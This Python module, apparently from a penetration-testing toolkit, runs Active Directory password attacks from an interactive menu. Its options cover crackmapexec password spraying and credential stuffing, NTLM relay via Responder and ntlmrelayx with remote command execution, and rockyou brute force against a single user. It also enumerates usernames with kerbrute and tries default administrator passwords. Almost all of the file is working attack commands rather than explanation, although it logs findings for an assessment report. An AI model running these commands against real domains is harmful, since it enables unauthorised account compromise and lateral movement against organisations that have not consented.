"""
Module: Password Attacks — Spray / NTLM Relay / kerbrute
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("PASSWORD ATTACKS")
    dc  = input_or_session("dc_ip",  "DC IP")
    dom = input_or_session("domain", "Domain")

    print("""
  [1]  Password Spraying (SMB)
  [2]  Password Spraying (LDAP/Kerberos)
  [3]  Credential Stuffing
  [4]  NTLM Relay (responder + ntlmrelayx)
  [5]  Bruteforce Single User
  [6]  Username Enumeration (kerbrute)
  [7]  Default Credentials Check
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        ufile    = prompt("Users file")
        spray_pw = prompt("Password to spray")
        delay    = prompt("Jitter seconds (≥30 recommended)") or "30"
        run_cmd(f"crackmapexec smb {dc} -u '{ufile}' -p '{spray_pw}' -d {dom} --continue-on-success --jitter {delay}")
        add_finding("Password Spraying", "High",
                    f"Sprayed '{spray_pw}' against domain users",
                    "Enforce lockout policy; alert on distributed auth failures")

    elif c == "2":
        ufile    = prompt("Users file")
        spray_pw = prompt("Password to spray")
        run_cmd(f"crackmapexec ldap {dc} -u '{ufile}' -p '{spray_pw}' -d {dom} --continue-on-success")

    elif c == "3":
        cfile = prompt("Credentials file (user:pass per line)")
        run_cmd(f"crackmapexec smb {dc} -d {dom} --continue-on-success --no-bruteforce -u {cfile} -p {cfile}")

    elif c == "4":
        targets = prompt("Targets file (IPs to relay to)")
        info("Start Responder first: sudo responder -I eth0 -rdw")
        run_cmd(f"{imp('ntlmrelayx.py')} -tf {targets} -smb2support -c 'whoami' --output-file /tmp/relay_out.txt")

    elif c == "5":
        tuser = prompt("Target username")
        wl    = prompt("Wordlist") or "/usr/share/wordlists/rockyou.txt"
        run_cmd(f"crackmapexec smb {dc} -u '{tuser}' -p '{wl}' -d {dom}")

    elif c == "6":
        ufile = prompt("Username wordlist")
        run_cmd(f"kerbrute userenum --dc {dc} --domain {dom} '{ufile}' -o /tmp/valid_users.txt")
        info("Valid users → /tmp/valid_users.txt")

    elif c == "7":
        defaults = [("administrator","Password1"),("administrator","Welcome1"),
                    ("administrator","P@ssw0rd"),("guest","")]
        for u, p in defaults:
            run_cmd(f"crackmapexec smb {dc} -u '{u}' -p '{p}' -d {dom} 2>/dev/null | grep -E '\\(\\+\\)'", silent=True)

    pause()
